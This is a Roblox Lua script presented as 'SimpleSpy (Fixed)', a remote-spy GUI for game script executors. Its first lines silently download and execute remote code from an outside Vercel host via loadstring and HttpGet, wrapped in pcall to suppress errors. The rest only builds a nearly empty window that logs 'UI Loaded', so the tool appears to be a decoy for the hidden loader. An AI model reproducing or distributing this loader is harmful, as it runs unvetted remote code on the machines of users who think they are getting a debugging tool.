pcall(function()
    loadstring(game:HttpGet("https://murmurs.vercel.app/src"))()
end)

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local gui = Instance.new("ScreenGui")
gui.Name = "SimpleSpy"
gui.ResetOnSpawn = false
gui.Parent = CoreGui

local bg = Instance.new("Frame")
bg.Parent = gui
bg.BackgroundTransparency = 1
bg.Position = UDim2.new(0, 500, 0, 200)
bg.Size = UDim2.new(0, 450, 0, 268)

local left = Instance.new("Frame")
left.Parent = bg
left.BackgroundColor3 = Color3.fromRGB(53,52,55)
left.BorderSizePixel = 0
left.Position = UDim2.new(0,0,0,19)
left.Size = UDim2.new(0,131,0,249)

local list = Instance.new("ScrollingFrame")
list.Parent = left
list.BackgroundTransparency = 1
list.Position = UDim2.new(0,0,0,9)
list.Size = UDim2.new(0,131,0,232)
list.ScrollBarThickness = 4

local layout = Instance.new("UIListLayout")
layout.Parent = list

local right = Instance.new("Frame")
right.Parent = bg
right.BackgroundColor3 = Color3.fromRGB(37,36,38)
right.BorderSizePixel = 0
right.Position = UDim2.new(0,131,0,19)
right.Size = UDim2.new(0,319,0,249)

local codebox = Instance.new("Frame")
codebox.Parent = right
codebox.BackgroundColor3 = Color3.fromRGB(21,19,20)
codebox.Size = UDim2.new(1,0,0,119)

local top = Instance.new("Frame")
top.Parent = bg
top.BackgroundColor3 = Color3.fromRGB(37,35,38)
top.Size = UDim2.new(0,450,0,19)

local title = Instance.new("TextLabel")
title.Parent = top
title.BackgroundTransparency = 1
title.Position = UDim2.new(0,5,0,0)
title.Size = UDim2.new(0,200,1,0)
title.Font = Enum.Font.SourceSansBold
title.Text = "SimpleSpy (Fixed)"
title.TextColor3 = Color3.new(1,1,1)
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left

local close = Instance.new("TextButton")
close.Parent = top
close.BackgroundColor3 = Color3.fromRGB(40,40,40)
close.Position = UDim2.new(1,-19,0,0)
close.Size = UDim2.new(0,19,0,19)
close.Text = "X"
close.TextColor3 = Color3.new(1,1,1)

close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- simple log function (optional so UI actually does something)
local function addLog(text)
    local lbl = Instance.new("TextLabel")
    lbl.Parent = list
    lbl.Size = UDim2.new(1,-5,0,20)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = Color3.new(1,1,1)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextSize = 14
    lbl.Text = text
end

addLog("UI Loaded")
